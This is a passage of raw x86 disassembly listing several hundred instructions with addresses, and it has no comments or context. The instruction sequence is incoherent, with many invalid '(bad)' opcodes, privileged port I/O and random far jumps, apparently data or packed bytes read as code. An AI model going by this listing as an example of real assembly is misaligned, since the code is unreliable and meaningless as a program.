  41d639:	mov    esp,0xa72642cd
  41d63e:	fiadd  DWORD PTR [ebx+0x24]
  41d641:	inc    edx
  41d642:	and    eax,0x8351aba
  41d647:	or     dl,ch
  41d649:	nop
  41d64a:	sbb    ch,BYTE PTR [ebx+0x44c03297]
  41d650:	mov    ecx,DWORD PTR ds:0xc8b6798a
  41d656:	cmp    DWORD PTR [edi],eax
  41d658:	dec    esi
  41d659:	addr16 xchg edi,eax
  41d65b:	xor    esi,eax
  41d65d:	fsub   DWORD PTR [edi+0x286f4f8f]
  41d663:	leave  
  41d664:	sbb    al,0x30
  41d666:	xchg   ebx,eax
  41d667:	fnstsw WORD PTR [ebp+0x29]
  41d66a:	mov    esi,0x772eaf71
  41d66f:	lock push ecx
  41d671:	mov    ebx,0x8dea1651
  41d676:	and    DWORD PTR [ecx+0x23],ecx
  41d679:	cmp    edi,DWORD PTR [ebp-0x27]
  41d67c:	xor    DWORD PTR [esi-0x7ced4d01],eax
  41d682:	mov    bh,al
  41d684:	xchg   ecx,eax
  41d685:	xchg   esp,eax
  41d686:	or     ebx,0xffffff99
  41d689:	int3   
  41d68a:	fs push edx
  41d68c:	dec    eax
  41d68d:	arpl   WORD PTR [edx],ax
  41d68f:	leave  
  41d690:	jmp    0x41d615
  41d692:	sti    
  41d693:	(bad)  
  41d694:	adc    BYTE PTR [ecx+0x74993e01],al
  41d69a:	xchg   edx,eax
  41d69b:	jmp    0x3ac0:0xd40a4351
  41d6a2:	jns    0x41d65d
  41d6a4:	mov    eax,0x66de0510
  41d6a9:	pop    esp
  41d6aa:	loope  0x41d6cd
  41d6ac:	ja     0x41d694
  41d6ae:	adc    ebp,edi
  41d6b0:	mov    eax,0x2d5aa207
  41d6b5:	jno    0x41d672
  41d6b7:	mov    WORD PTR [esi+0x5001c5c5],fs
  41d6bd:	push   0x7f
  41d6bf:	in     al,dx
  41d6c0:	jmp    0x92b6:0xebd18ea0
  41d6c7:	add    eax,0xf0f3ebae
  41d6cc:	fbstp  TBYTE PTR [ebx+ebp*8+0xe]
  41d6d0:	sub    DWORD PTR [edi-0x49],esi
  41d6d3:	add    dh,BYTE PTR [ebp+0x2bd64a4e]
  41d6d9:	inc    ecx
  41d6da:	enter  0xab79,0xb4
  41d6de:	add    bl,BYTE PTR [ebx-0xb]
  41d6e1:	and    BYTE PTR [edi+0x2104d9d2],ah
  41d6e7:	popa   
  41d6e8:	pusha  
  41d6e9:	ficom  DWORD PTR [ebp-0x28]
  41d6ec:	lock inc edx
  41d6ee:	jg     0x41d697
  41d6f0:	repz sbb ebp,DWORD PTR [esi-0xeae0e23]
  41d6f7:	gs mov ebp,0x5dc267e8
  41d6fd:	cmc    
  41d6fe:	jmp    0x41d6f9
  41d700:	push   edx
  41d701:	and    dl,BYTE PTR [eax-0x21]
  41d704:	cs push esi
  41d706:	call   0xfe83d44c
  41d70b:	mov    eax,ds:0xf5949da3
  41d710:	pushf  
  41d711:	cwde   
  41d712:	xchg   edx,eax
  41d713:	mov    ds:0xe341bcfd,eax
  41d718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d719:	push   0x1e
  41d71b:	test   eax,0x96825677
  41d720:	xor    eax,0x8dc02344
  41d725:	ret    
  41d726:	jo     0x41d70a
  41d728:	fdivr  st(6),st
  41d72a:	test   DWORD PTR [esi-0x4f0e5472],ebx
  41d730:	adc    al,0x14
  41d732:	add    al,0xf
  41d734:	cld    
  41d735:	jge    0x41d71c
  41d737:	aam    0x4b
  41d739:	in     eax,0xb9
  41d73b:	and    eax,0xf2425094
  41d740:	push   ebx
  41d741:	out    dx,eax
  41d742:	jo     0x41d75a
  41d744:	dec    edi
  41d745:	lods   al,BYTE PTR ds:[esi]
  41d746:	fs pop ecx
  41d748:	outs   dx,DWORD PTR ds:[esi]
  41d749:	rcl    DWORD PTR [ebp-0x117451b],1
  41d74f:	pop    esi
  41d750:	outs   dx,BYTE PTR ds:[esi]
  41d751:	mov    ebx,0x7a1739c7
  41d756:	mov    ds:0x5698e1f3,eax
  41d75b:	fs mov dl,0x2a
  41d75e:	mov    ah,0x85
  41d760:	aam    0xc7
  41d762:	sub    cl,ah
  41d764:	mov    BYTE PTR [edx+0x113cfadd],bh
  41d76a:	push   esi
  41d76b:	stos   DWORD PTR es:[edi],eax
  41d76c:	xor    dl,BYTE PTR [esi]
  41d76e:	rcl    BYTE PTR [edi+esi*8+0x540ce200],0xef
  41d776:	pop    ss
  41d777:	and    eax,0xce9a2ebc
  41d77c:	in     al,0x26
  41d77e:	sub    eax,edi
  41d780:	mov    dl,0x83
  41d782:	inc    edi
  41d783:	xor    eax,0x7b3b6e4f
  41d788:	(bad)  
  41d789:	fs adc al,0xd9
  41d78c:	or     dh,BYTE PTR [edx-0x62]
  41d78f:	push   es
  41d790:	jnp    0x41d794
  41d792:	hlt    
  41d793:	jp     0x41d796
  41d795:	xchg   edx,eax
  41d796:	scas   al,BYTE PTR es:[edi]
  41d797:	jle    0x41d793
  41d799:	retf   
  41d79a:	mov    al,BYTE PTR [eax-0x14a76a79]
  41d7a0:	je     0x41d778
  41d7a2:	mov    edx,0x9c13b1f2
  41d7a7:	and    eax,0x1fc04244
  41d7ac:	ss xor ebp,eax
  41d7af:	inc    edx
  41d7b0:	test   BYTE PTR [eax],al
  41d7b2:	push   ebp
  41d7b3:	or     DWORD PTR [edx-0x38c8de93],eax
  41d7b9:	sbb    eax,0x9b0026b2
  41d7be:	fimul  DWORD PTR [ecx]
  41d7c0:	mov    dh,0xcd
  41d7c2:	sti    
  41d7c3:	rcl    DWORD PTR [ebp+0x3d9cd658],0xf
  41d7ca:	mov    BYTE PTR [ebp+0x2c],ch
  41d7cd:	out    0xe1,eax
  41d7cf:	jno    0x41d78c
  41d7d1:	test   al,0xf1
  41d7d3:	(bad)  
  41d7d4:	shl    DWORD PTR [eax],cl
  41d7d6:	jl     0x41d765
  41d7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7d9:	mov    bh,0xda
  41d7db:	retf   0x93ed
  41d7de:	sahf   
  41d7df:	in     al,0x8c
  41d7e1:	fisub  WORD PTR [ecx]
  41d7e3:	aam    0x54
  41d7e5:	ja     0x41d81e
  41d7e7:	cmp    BYTE PTR [edx+0x5ba7779a],cl
  41d7ed:	aas    
  41d7ee:	jmp    0x41d853
  41d7f0:	push   ss
  41d7f1:	(bad)  
  41d7f2:	fldcw  WORD PTR [edx+0x68]
  41d7f5:	cdq    
  41d7f6:	bound  ecx,QWORD PTR [edi]
  41d7f8:	gs popa 
  41d7fa:	aaa    
  41d7fb:	adc    al,0xec
  41d7fd:	sbb    BYTE PTR [eax],bl
  41d7ff:	jmp    0x2c59:0x336aa0ad
  41d806:	or     DWORD PTR [ebx+0x16c7a2cb],ebx
  41d80c:	pop    ds
  41d80d:	dec    edx
  41d80e:	js     0x41d7c7
  41d810:	mov    BYTE PTR [esi+0xb308397],0xa3
  41d817:	xchg   ecx,eax
  41d818:	aaa    
  41d819:	loopne 0x41d853
  41d81b:	xchg   edx,eax
  41d81c:	sbb    BYTE PTR [edi],dh
  41d81e:	imul   ecx,DWORD PTR [edx+0x4806b377],0x47
  41d825:	mov    esp,0xa280e0b4
  41d82a:	iret   
  41d82b:	popa   
  41d82c:	push   eax
  41d82d:	pop    ebx
  41d82e:	sbb    DWORD PTR [ebp+0x5b219ec8],edx
  41d834:	jmp    0xc368b81e
  41d839:	jae    0x41d7c9
  41d83b:	jno    0x41d887
  41d83d:	int3   
  41d83e:	push   edx
  41d83f:	int    0x12
  41d841:	inc    edi
  41d842:	adc    DWORD PTR [edx],0x96ff5da2
  41d848:	jge    0x41d82e
  41d84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d84b:	pop    ss
  41d84c:	xchg   ebx,eax
  41d84d:	add    eax,ecx
  41d84f:	ds aam 0x82
  41d852:	(bad)  
  41d853:	mov    eax,DWORD PTR [ecx-0x9b69342]
  41d859:	test   ch,bh
  41d85b:	pop    ebp
  41d85c:	jge    0x41d80b
  41d85e:	xchg   DWORD PTR [ebx+eax*2-0x699522a5],edi
  41d865:	xlat   BYTE PTR ds:[ebx]
  41d866:	imul   eax,DWORD PTR [ebp-0x3f],0x72
  41d86a:	out    dx,al
  41d86b:	stos   DWORD PTR es:[edi],eax
  41d86c:	daa    
  41d86d:	and    BYTE PTR [esp+esi*2+0x1b],0x6b
  41d872:	icebp  
  41d873:	addr16 aam 0xc3
  41d876:	mov    eax,ds:0xf6111b2
  41d87b:	in     al,0xce
  41d87d:	lahf   
  41d87e:	pop    edi
  41d87f:	xor    eax,0x2bb4c484
  41d884:	(bad)  
  41d886:	sbb    BYTE PTR [edi-0x5668f04d],dl
  41d88c:	xchg   esp,eax
  41d88d:	inc    eax
  41d88e:	int3   
  41d88f:	mov    ch,0x7a
  41d891:	aam    0x79
  41d893:	jl     0x41d875
  41d895:	xor    eax,0xbc77a7ef
  41d89a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d89b:	retf   0x7ac1
  41d89e:	clc    
  41d89f:	imul   esi,DWORD PTR [edi],0x4d0107b2
  41d8a5:	je     0x41d87f
  41d8a7:	add    ah,BYTE PTR [ecx+0x669ae6ed]
  41d8ad:	jp     0x41d87b
  41d8af:	lock adc ch,BYTE PTR ds:[ebx+esi*1+0x3373547f]
  41d8b8:	jno    0x41d90e
  41d8ba:	mov    ah,BYTE PTR [esi-0x44df0897]
  41d8c0:	sbb    BYTE PTR [ebx-0x58],0x4e
  41d8c4:	cmovp  ebx,ebx
  41d8c7:	ret    0x927e
  41d8ca:	push   ds
  41d8cb:	in     al,0x69
  41d8cd:	out    dx,eax
  41d8ce:	sbb    esi,DWORD PTR [ebx-0x7fe8db21]
  41d8d4:	ins    DWORD PTR es:[edi],dx
  41d8d5:	jp     0x41d860
  41d8d7:	aaa    
  41d8d8:	in     eax,dx
  41d8d9:	cmp    al,0x5b
  41d8db:	das    
  41d8dc:	call   0xc28c:0x3e7dd79f
  41d8e3:	push   0xffffffde
  41d8e5:	mov    ecx,0xc8f4ed8d
  41d8ea:	mov    edi,0xb8ff45eb
  41d8ef:	sbb    eax,0x4285f30d
  41d8f4:	and    al,0xa5
  41d8f6:	pop    eax
  41d8f7:	mov    edi,0x4ceb56db
  41d8fc:	inc    eax
  41d8fd:	es (bad) 
  41d900:	and    eax,0x808efc13
  41d905:	imul   ecx,DWORD PTR [ecx+0x2e],0xffffffbe
  41d909:	xchg   esp,eax
  41d90a:	or     eax,0x6b77f8c
  41d90f:	je     0x41d963
  41d911:	test   esp,esi
  41d913:	jo     0x41d983
  41d915:	mov    edi,0xd9fe7721
  41d91a:	sbb    DWORD PTR [ecx+0x1f],edx
  41d91d:	pop    ds
  41d91e:	mov    eax,ds:0xeeead76c
  41d923:	mov    eax,ds:0xd924c88a
  41d928:	push   ebx
  41d929:	inc    ecx
  41d92a:	(bad)  
  41d92c:	mov    edi,0xe361ec8a
  41d931:	sahf   
  41d932:	cwde   
  41d933:	pop    es
  41d934:	dec    ebp
  41d935:	les    edi,FWORD PTR [esi]
  41d937:	or     al,0x47
  41d939:	(bad)  
  41d93a:	cs aaa 
  41d93c:	inc    edx
  41d93d:	add    cl,BYTE PTR [ebx+0xc]
  41d940:	adc    ah,cl
  41d942:	sar    DWORD PTR [ecx+0x57],0x6b
  41d946:	outs   dx,BYTE PTR ds:[esi]
  41d947:	jae    0x41d93e
  41d949:	xor    BYTE PTR [ecx+esi*8+0x72],bh
  41d94d:	(bad)  
  41d94e:	aad    0x55
  41d950:	loopne 0x41d970
  41d952:	imul   ebp,DWORD PTR [edx+0x40],0x7692ff60
  41d959:	(bad)  
  41d95a:	mov    dl,0xbf
  41d95c:	sbb    eax,0x1866f4d2
  41d961:	loop   0x41d9da
  41d963:	mov    bl,0x9e
  41d965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d966:	mov    ds:0xb1f1aed8,eax
  41d96b:	mov    edx,0x44e94de8
  41d970:	aam    0xed
  41d972:	outs   dx,BYTE PTR ds:[esi]
  41d973:	stos   BYTE PTR es:[edi],al
  41d974:	sbb    DWORD PTR [edi-0x2d],eax
  41d977:	mov    DWORD PTR [edx-0x5a],ebp
  41d97a:	loop   0x41d9c0
  41d97c:	push   es
  41d97d:	mov    ch,0x9d
  41d97f:	jecxz  0x41d9fd
  41d981:	imul   ecx,edx,0x96d57ae4
  41d987:	mov    al,ds:0x3d093634
  41d98c:	ret    
  41d98d:	test   DWORD PTR ds:0x3f528bb,0x1c222db2
  41d997:	push   eax
  41d998:	pop    edx
  41d999:	xor    eax,edi
  41d99b:	inc    edi
  41d99c:	das    
  41d99d:	in     eax,0x8f
  41d99f:	mov    edx,0xc8c27ca8
  41d9a4:	std    
  41d9a5:	pop    ds
  41d9a6:	inc    esp
  41d9a7:	push   ss
  41d9a8:	adc    al,0xdf
  41d9aa:	sub    dl,dh
  41d9ac:	push   es
  41d9ad:	push   esi
  41d9ae:	aad    0x49
  41d9b0:	jmp    0x51dceb8e
  41d9b5:	enter  0x8ff2,0xe9
  41d9b9:	lahf   
  41d9ba:	mov    ebx,DWORD PTR [eax-0x70215943]
  41d9c0:	(bad)
  41d9c4:	out    dx,al
  41d9c5:	or     eax,0xac8ebc51
  41d9ca:	push   ss
  41d9cb:	or     esi,DWORD PTR [ebx-0x36]
  41d9ce:	pop    ebx
  41d9cf:	cmc    
  41d9d0:	outs   dx,BYTE PTR ds:[esi]
  41d9d1:	fld    TBYTE PTR [eax-0x2cfd420]
  41d9d7:	call   0x27e2f9bd
  41d9dc:	ror    BYTE PTR [edx],cl
  41d9de:	mov    cl,BYTE PTR [ebx-0x39]
  41d9e1:	mov    ecx,0x87a3d72a
  41d9e6:	mov    BYTE PTR [ecx-0x11632d15],0x48
  41d9ed:	sub    DWORD PTR [ebx+ecx*1],ebp
  41d9f0:	dec    ebx
  41d9f1:	ins    DWORD PTR es:[edi],dx
  41d9f2:	mov    cl,0xe3
  41d9f4:	or     DWORD PTR [ebp+0x35],edx
  41d9f7:	pop    edi
  41d9f8:	test   edi,esi
  41d9fa:	aaa    
  41d9fb:	movups xmm5,XMMWORD PTR [esi+0x7511bee6]
  41da02:	cmp    DWORD PTR [eax+ebp*4],0x6e00e417
  41da09:	loopne 0x41da8a
  41da0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da0c:	shl    BYTE PTR ds:0xa386b91,1
  41da12:	cld    
  41da13:	iret   
  41da14:	inc    ecx
  41da15:	stos   BYTE PTR es:[edi],al
  41da16:	fcmovnu st,st(5)
  41da18:	sbb    ebx,DWORD PTR [edi*1+0x6d2bbe05]
  41da1f:	rol    BYTE PTR [esi],0xb1
  41da22:	and    cl,0xfb
  41da25:	scas   al,BYTE PTR es:[edi]
  41da26:	dec    edx
  41da27:	loopne 0x41da2d
  41da29:	out    0x17,al
  41da2b:	mov    cl,0x2d
  41da2d:	pushf  
  41da2e:	lahf   
  41da2f:	aam    0x42
  41da31:	xor    al,BYTE PTR [eax]
  41da33:	loopne 0x41da54
  41da35:	pop    ss
  41da36:	dec    edi
  41da37:	push   esp
  41da38:	jns    0x41da47
  41da3a:	xor    dl,bh
  41da3c:	test   DWORD PTR [ebx],ebp
  41da3e:	ja     0x41da69
  41da40:	ins    BYTE PTR es:[edi],dx
  41da41:	add    DWORD PTR [ebx],0x2
  41da44:	(bad)  
  41da46:	imul   ebx,DWORD PTR [edx],0x7a
  41da49:	push   ecx
  41da4a:	mov    cl,0xe7
  41da4c:	call   0x774c6487
  41da51:	into   
  41da52:	shl    DWORD PTR [esi+0x2],0x1b
  41da56:	repz dec ebx
  41da58:	(bad)  
  41da59:	iret   
  41da5a:	sahf   
  41da5b:	aaa    
  41da5c:	cli    
  41da5d:	loop   0x41daa5
  41da5f:	inc    eax
  41da60:	add    DWORD PTR cs:0x903b608d,ecx
  41da67:	retf   0xa9db
  41da6a:	adc    al,0x7d
  41da6c:	aad    0x31
  41da6e:	cli    
  41da6f:	cmp    BYTE PTR [eax-0x25],al
  41da72:	aaa    
  41da73:	jg     0x41da3a
  41da75:	ror    DWORD PTR [eax+ebp*2+0x5c],0xe0
  41da7a:	jne    0x41dacf
  41da7c:	fimul  DWORD PTR [ecx+ebp*2]
  41da7f:	stc    
  41da80:	imul   ebp,DWORD PTR [eax],0x641df962
  41da86:	cli    
  41da87:	imul   DWORD PTR [ecx+edx*8+0x29]
  41da8b:	mov    edx,0x4f74e881
  41da90:	push   ecx
  41da91:	imul   esi,DWORD PTR ss:[ecx],0xffffffc9
  41da95:	xor    BYTE PTR ds:0xcdb0c7e4,cl
  41da9b:	cmp    BYTE PTR [ecx+0x7],cl
  41da9e:	adc    cl,BYTE PTR [eax-0x59cbb850]
  41daa4:	daa    
  41daa5:	fldz   
  41daa7:	dec    esi
  41daa8:	xor    DWORD PTR [edi],edi
  41daaa:	dec    eax
  41daab:	fimul  DWORD PTR [esi+0x70]
  41daae:	lds    eax,FWORD PTR [edx+ebp*1]
  41dab1:	scas   eax,DWORD PTR es:[edi]
  41dab2:	mov    eax,0x86cd40f5
  41dab7:	lods   al,BYTE PTR ds:[esi]
  41dab8:	jnp    0x41da53
  41daba:	lds    edx,FWORD PTR [edi+ecx*2-0x6a30c7f8]
  41dac1:	sahf   
  41dac2:	pop    esi
  41dac3:	iret   
  41dac4:	xchg   edi,eax
  41dac5:	daa    
  41dac6:	pop    ebx
  41dac7:	in     eax,dx
  41dac8:	loop   0x41da72
  41daca:	(bad)  
  41dacb:	jbe    0x41da71
  41dacd:	inc    ecx
  41dace:	jle    0x41da51
  41dad0:	out    0x63,al
  41dad2:	cwde   
  41dad3:	xlat   BYTE PTR ds:[ebx]
  41dad4:	inc    ecx
  41dad5:	push   es
  41dad6:	enter  0x5364,0x66
  41dada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dadb:	xchg   ch,ah
  41dadd:	add    bl,BYTE PTR [ecx]
  41dadf:	add    BYTE PTR [ebx],cl
  41dae1:	neg    BYTE PTR [esi+eax*4+0x35f3adee]
  41dae8:	mov    edx,DWORD PTR [esi]
  41daea:	jp     0x41db1a
  41daec:	aad    0x98
  41daee:	(bad)  
  41daef:	xchg   edi,ecx
  41daf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daf2:	gs (bad) 
  41daf4:	es js  0x41dad4
  41daf7:	pushf  
  41daf8:	rcl    DWORD PTR [ecx+0x51],1
  41dafb:	inc    edx
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   eax
  41dafe:	cld    
  41daff:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41db01:	jne    0x41daf2
  41db03:	pushf  
  41db04:	jg     0x41da8f
  41db06:	sub    al,0x3a
  41db08:	pop    ds
  41db09:	inc    edi
  41db0a:	push   ss
  41db0b:	lods   al,BYTE PTR ds:[esi]
  41db0c:	(bad)  
  41db0d:	rol    DWORD PTR cs:[esi-0x5b],0x74
  41db12:	loop   0x41daa4
  41db14:	out    dx,al
  41db15:	cmp    DWORD PTR [edx-0x40],edx
  41db18:	lods   al,BYTE PTR ds:[esi]
  41db19:	hlt    
  41db1a:	jns    0x41db13
  41db1c:	int3   
  41db1d:	jo     0x41dac2
  41db1f:	shl    BYTE PTR [ecx],0x7b
  41db22:	inc    esi
  41db23:	(bad)  [edi+0x4bbfb750]
  41db29:	jmp    0x2d3c:0x4620807a
  41db30:	jb     0x41dad1
  41db32:	lock (bad) 
  41db34:	lgs    eax,FWORD PTR [esp+ecx*8-0x5e3e824d]
  41db3c:	popa   
  41db3d:	push   esp
  41db3e:	adc    BYTE PTR [edi],0xc
  41db41:	push   esi
  41db42:	and    dl,al
  41db44:	aas    
  41db45:	pop    ss
  41db46:	stos   BYTE PTR es:[edi],al
  41db47:	mov    cl,0xc6
  41db49:	ins    DWORD PTR es:[edi],dx
  41db4a:	mov    esi,0x4fa72b83
  41db4f:	push   edx
  41db50:	hlt    
  41db51:	icebp  
  41db52:	jns    0x41db73
  41db54:	add    DWORD PTR [edx],edx
  41db56:	inc    edi
  41db57:	int    0x57
  41db59:	fs mov al,0x4e
  41db5c:	xchg   ebx,eax
  41db5d:	in     al,dx
  41db5e:	dec    esp
  41db5f:	ja     0x41db0d
  41db61:	push   edi
  41db62:	xchg   ebx,eax
  41db63:	rol    DWORD PTR gs:[ecx-0x20],0xfd
  41db68:	lahf   
  41db69:	inc    eax
  41db6a:	(bad)  
  41db6b:	in     eax,dx
  41db6c:	cmc    
  41db6d:	out    0x5e,al
  41db6f:	mov    dh,0xfc
  41db71:	sti    
  41db72:	xor    al,0xcf
  41db74:	sbb    al,0xf
  41db76:	sbb    eax,0x5a3cb8ae
  41db7b:	jp     0x41db89
  41db7d:	or     eax,0xe327cd66
  41db82:	pop    ecx
  41db83:	popa   
  41db84:	mov    bh,0x3c
  41db86:	jo     0x41db0f
  41db88:	ja     0x41db9c
  41db8a:	jns    0x41dbff
  41db8c:	or     esp,ebx
  41db8e:	ss ss scas al,BYTE PTR es:[edi]
  41db91:	imul   ecx,DWORD PTR [ebx],0x5d
  41db94:	jmp    0x41db40
  41db96:	das    
  41db97:	mov    esi,0x1468957b
  41db9c:	push   0x6b
  41db9e:	and    cl,BYTE PTR [ebx-0x30]
  41dba1:	imul   esp,DWORD PTR [esi-0x72ccb340],0x84a933c3
  41dbab:	sub    eax,DWORD PTR [ebx-0x72]
  41dbae:	mov    esi,0xa9af336c
  41dbb3:	xlat   BYTE PTR ds:[ebx]
  41dbb4:	mov    ecx,DWORD PTR [ebx-0x13]
  41dbb7:	int3   
  41dbb8:	gs ins DWORD PTR es:[edi],dx
  41dbba:	xchg   esi,eax
  41dbbb:	loopne 0x41dbe0
  41dbbd:	add    al,bh
  41dbbf:	add    cl,cl
  41dbc1:	mov    ch,0x88
  41dbc3:	fwait
  41dbc4:	and    BYTE PTR [ebp-0x5b80265e],dl
  41dbca:	jp     0x41db7d
  41dbcc:	ret    0xa1a9
  41dbcf:	xor    DWORD PTR ds:0x362f017f,edx
  41dbd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbd6:	push   edx
  41dbd7:	sub    esi,edx
  41dbd9:	pop    ss
  41dbda:	cwde   
  41dbdb:	data16 loop 0x41dbfd
  41dbde:	pop    es
  41dbdf:	lds    edi,FWORD PTR [ecx-0x69bdae6a]
  41dbe5:	pop    ebp
  41dbe6:	inc    edx
  41dbe7:	out    dx,al
  41dbe8:	push   esi
  41dbe9:	ins    BYTE PTR es:[edi],dx
  41dbea:	es mov esp,eax
  41dbed:	dec    edi
  41dbee:	pop    es
  41dbef:	or     edi,0x228eaf0e
  41dbf5:	ins    DWORD PTR es:[edi],dx
  41dbf6:	out    0xd6,eax
  41dbf8:	mov    edx,0xaf56bce
  41dbfd:	addr16 jmp 0x41dc40
  41dc00:	clc    
  41dc01:	jle    0x41dbd3
  41dc03:	ret    
  41dc04:	clc    
  41dc05:	fdiv   DWORD PTR [edx+0x682f6b4e]
  41dc0b:	pop    ss
  41dc0c:	dec    ebx
  41dc0d:	shr    BYTE PTR ds:0x674a13fa,1
  41dc13:	int3   
  41dc14:	jg     0x41dc95
  41dc16:	hlt    
  41dc17:	push   cs
  41dc18:	or     eax,0xa4fcb95e
  41dc1d:	add    BYTE PTR [ebx+esi*1],bl
  41dc20:	mov    ch,ah
  41dc22:	xor    DWORD PTR [edx+0xd8e7412],eax
  41dc28:	cdq    
  41dc29:	or     DWORD PTR [ebx-0x23242fa2],eax
  41dc2f:	xor    edx,DWORD PTR [ebx+0x1a]
  41dc32:	out    0xc3,eax
  41dc34:	dec    ebp
  41dc35:	sub    ch,bh
  41dc37:	mov    ds:0xde826272,al
  41dc3c:	mov    eax,0x74654102
  41dc41:	call   0x67d43b1d
  41dc46:	out    dx,al
  41dc47:	xchg   esp,eax
  41dc48:	mov    eax,0xc6eb7ad
  41dc4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc4e:	adc    BYTE PTR [ecx+0x64d3b953],al
  41dc54:	adc    dh,0x5f
  41dc57:	mov    ecx,0x2680a673
  41dc5c:	adc    al,0x7d
  41dc5e:	pusha  
  41dc5f:	mov    ah,0x18
  41dc61:	inc    ebx
  41dc62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc63:	leave  
  41dc64:	shl    edi,1
  41dc66:	mov    eax,0xf876c493
  41dc6b:	or     ebp,DWORD PTR [ebp+ebx*1-0x43]
  41dc6f:	fs inc esi
  41dc71:	adc    edi,DWORD PTR [ecx-0x71bbf63a]
  41dc77:	sbb    BYTE PTR [eax],ah
  41dc79:	xchg   BYTE PTR [ebx],cl
  41dc7b:	xor    al,0x6a
  41dc7d:	js     0x41dcd3
  41dc7f:	push   0xffffff97
  41dc81:	ror    BYTE PTR [ebx+0x29fcc692],0xa5
  41dc88:	adc    BYTE PTR ds:0x9f7e7c76,bl
  41dc8e:	test   DWORD PTR [ebp-0x1e],0xe4b53dde
  41dc95:	rol    DWORD PTR [ecx],cl
  41dc97:	dec    ebp
  41dc98:	cmp    eax,0xb11a2e44
  41dc9d:	xchg   esi,eax
  41dc9e:	push   0xffffffce
  41dca0:	bound  ebx,QWORD PTR [ebx-0x12e14387]
  41dca6:	add    DWORD PTR [edi+esi*4],edx
  41dca9:	mov    BYTE PTR [edx-0x2d],0x84
  41dcad:	aas    
  41dcae:	inc    esi
  41dcaf:	mov    ebx,0x3213c117
  41dcb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcb5:	xor    al,0x6
  41dcb7:	and    al,0x34
  41dcb9:	sub    cl,BYTE PTR [ecx+0xa87fa7f]
  41dcbf:	mov    dl,0x1d
  41dcc1:	jo     0x41dcdc
  41dcc3:	jp     0x41dcfd
  41dcc5:	lods   eax,DWORD PTR ds:[esi]
  41dcc6:	inc    ebp
  41dcc7:	mov    bl,0xc5
  41dcc9:	lds    eax,FWORD PTR [ecx+ebx*1]
  41dccc:	pop    edi
  41dccd:	cmp    DWORD PTR [edi],ebp
  41dccf:	jno    0x41dd10
  41dcd1:	xchg   ebx,eax
  41dcd2:	push   cs
  41dcd3:	lea    ebp,ds:0xbf43189e
  41dcd9:	xchg   BYTE PTR [esi-0x1a8e47b7],cl
  41dcdf:	out    dx,eax
  41dce0:	or     bh,BYTE PTR [ecx+0x3c98524c]
  41dce6:	je     0x41dcf3
  41dce8:	pop    ebp
  41dce9:	jp     0x41dcd4
  41dceb:	fsubr  QWORD PTR [edi+0x3569afdf]
  41dcf1:	add    eax,0x952a54ec
  41dcf6:	fidivr DWORD PTR [esp+edi*4+0x3]
  41dcfa:	daa    
  41dcfb:	aam    0xab
  41dcfd:	inc    ebp
  41dcfe:	pusha  
  41dcff:	aam    0x70
  41dd01:	(bad)  
  41dd02:	mov    ch,0x68
  41dd04:	dec    edi
  41dd05:	pop    edx
  41dd06:	add    esp,DWORD PTR [ebx-0x1c]
  41dd09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd0a:	cwde   
  41dd0b:	daa    
  41dd0c:	cmp    BYTE PTR [eax],dl
  41dd0e:	push   edi
  41dd0f:	stos   DWORD PTR es:[edi],eax
  41dd10:	add    eax,0x61dab80
  41dd15:	sub    eax,0x12918a61
  41dd1a:	rcl    BYTE PTR [ebp+edx*8+0x7fe0e6f4],cl
  41dd21:	inc    esi
  41dd22:	dec    eax
  41dd23:	loopne 0x41dd17
  41dd25:	jecxz  0x41dda0
  41dd27:	dec    esp
  41dd28:	sub    BYTE PTR ds:0x7464851f,al
  41dd2e:	adc    dl,bl
  41dd30:	sbb    al,0xfa
  41dd32:	loope  0x41dd90
  41dd34:	lods   eax,DWORD PTR ds:[esi]
  41dd35:	inc    esi
  41dd36:	pop    edx
  41dd37:	xor    esp,DWORD PTR [eax]
  41dd39:	inc    eax
  41dd3a:	xchg   ecx,eax
  41dd3b:	pop    edi
  41dd3c:	dec    ecx
  41dd3d:	mov    dh,0xe7
  41dd3f:	and    cl,ch
  41dd41:	enter  0xd000,0x24
  41dd45:	push   es
  41dd46:	aam    0x52
  41dd48:	ret    
  41dd49:	mul    DWORD PTR [eax+0x66f5e7ff]
  41dd4f:	pop    ebp
  41dd50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd51:	shr    ch,1
  41dd53:	retf   0x2bf0
  41dd56:	adc    eax,0xa02badb5
  41dd5b:	push   ebp
  41dd5c:	mov    esp,0x489ed02c
  41dd61:	popf   
  41dd62:	cmp    al,0x64
  41dd64:	repz inc ecx
  41dd66:	jg     0x41dd2d
  41dd68:	mov    bl,0xa7
  41dd6a:	aas    
  41dd6b:	rcl    DWORD PTR [edx],1
  41dd6d:	push   edi
  41dd6e:	mov    al,0xc4
  41dd70:	hlt    
  41dd71:	push   esp
  41dd72:	xchg   edx,eax
  41dd73:	and    eax,0x14783760
  41dd78:	add    edx,ecx
  41dd7a:	push   ecx
  41dd7b:	mov    ds:0xececfe0a,al
  41dd81:	int3   
  41dd82:	dec    eax
  41dd83:	xchg   ebx,eax
  41dd84:	and    eax,0x71504f0c
  41dd89:	and    DWORD PTR [edx+0x69c8ee04],eax
  41dd8f:	das    
  41dd90:	imul   eax,DWORD PTR [ebp-0x2],0xffffffbe
  41dd94:	dec    edx
  41dd95:	cmp    BYTE PTR [esi+0x75],0xb
  41dd99:	mov    edi,0x5e5cf6c4
  41dd9e:	mov    DWORD PTR [eax-0x49],ecx
  41dda1:	sub    al,0x57
  41dda3:	jmp    0x33fa02f4
  41dda8:	int    0xdb
  41ddaa:	scas   al,BYTE PTR es:[edi]
  41ddab:	inc    esi
  41ddac:	cdq    
